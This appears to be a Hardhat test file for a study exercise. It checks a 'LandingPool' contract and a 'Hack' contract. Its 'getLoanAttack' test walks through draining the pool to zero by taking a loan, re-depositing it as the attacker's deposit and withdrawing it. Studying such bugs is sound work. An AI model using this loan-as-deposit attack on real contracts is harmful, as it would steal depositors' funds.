const { expect } = require("chai");
const { ethers } = require("hardhat");
// const { solidity } = require("ethereum-waffle");

describe("Hack", function () {
  let owner
  let hacker
  let lp
  let hack

  beforeEach(async function() {
    [owner, hacker] = await ethers.getSigners()

    const LandingPool = await ethers.getContractFactory("LandingPool", owner)
    lp = await LandingPool.deploy()
    await lp.deployed()

    const Hack = await ethers.getContractFactory("Hack", hacker)
    hack = await Hack.deploy(lp.address)
    await hack.deployed()
  })

  it("User shuld can deposit funds", async function() {
    const amount = 100

    const tx = await lp.connect(hacker).deposit({ value: amount })
    await expect(() => tx)
      .to.changeEtherBalances([hacker, lp], [-amount, amount])
    await tx.wait()

    expect(await lp.showDepositBalance(hacker.address))
      .to.eq(amount)
  })

  it("User shuld can withdrow funds", async function() {
    const amount = 100

    const depositTx = await lp.connect(hacker).deposit({ value: amount })
    await expect(() => depositTx)
      .to.changeEtherBalances([hacker, lp], [-amount, amount])
    await depositTx.wait()

    expect(await lp.showDepositBalance(hacker.address))
      .to.eq(amount)

    const withdrawTx = await lp.connect(hacker).withdraw()
    await expect(() => withdrawTx)
      .to.changeEtherBalances([lp, hacker], [-amount, amount])
    await withdrawTx.wait()
  })

  // Hack contract

  it("hack contract shuld have LP contract address", async function() {
    // console.log("LP address:", lp.address)
    expect(await hack.LP()).to.eq(lp.address)
  })

  it("shuld show balance", async function() {
    // let amount = 10 ** 18
    let amount = 10 ** 10
    let tx = await hack.connect(hacker).deposit({ value: amount})
    await expect(() => tx)
      .to.changeEtherBalances([hacker, hack], [-amount, amount])
    await tx.wait()
    
    expect(await hack.showBalance()).to.eq(amount)
  })

  it("getLoanAttack", async function() {
    let amount = 10 ** 5
    
    // Владелец или другой пользователь вносят средства в пул LP
    let tx = await lp.connect(owner).deposit({ value: amount})
    await expect(() => tx)
      .to.changeEtherBalances([owner, lp], [-amount, amount])
    await tx.wait()

    // // Пополнение контракта Hack (для оплаты транзакции)
    // tx = await hack.connect(hacker).deposit({ value: amount})
    // await expect(() => tx)
    // .to.changeEtherBalances([hacker, hack], [-amount, amount])
    // await tx.wait()
    
    
    // Hacker и контракт hack до атаки не имели средств на депозите в LP
    expect(await lp.showDepositBalance(hacker.address)).to.eq(0)
    expect(await lp.showDepositBalance(hack.address)).to.eq(0)
    
    // Баланс LP до атаки
    const lpBalanceBefore = await lp.showBalance()
    expect(lpBalanceBefore).to.eq(amount)
    
    // Берем займ и депозитим его в LP
    tx = await hack.connect(hacker).getLoanAttack()
    // Баланс LP после займа - не изменнен
    expect(lpBalanceBefore).to.eq(amount)

    // Контракт hack после атаки имеет средства на депозите в LP
    expect(await lp.showDepositBalance(hack.address)).to.eq(amount)

    // Контракт hack вызовит средства из депозита
    tx = await hack.connect(hacker).withdrawFromLP()
    await expect(() => tx)
      .to.changeEtherBalances([lp, hack], [-amount, amount])
    expect(await lp.showDepositBalance(hack.address)).to.eq(0)
    
    // Hacker выводит средства из контракта hack после атаки
    tx = await hack.connect(hacker).withdraw()
    await expect(() => tx)
      .to.changeEtherBalances([hack, hacker], [-amount, amount])
    await tx.wait()

    // Баланс LP после атаки = 0
    expect(await lp.showBalance()).to.eq(0)
  })
});
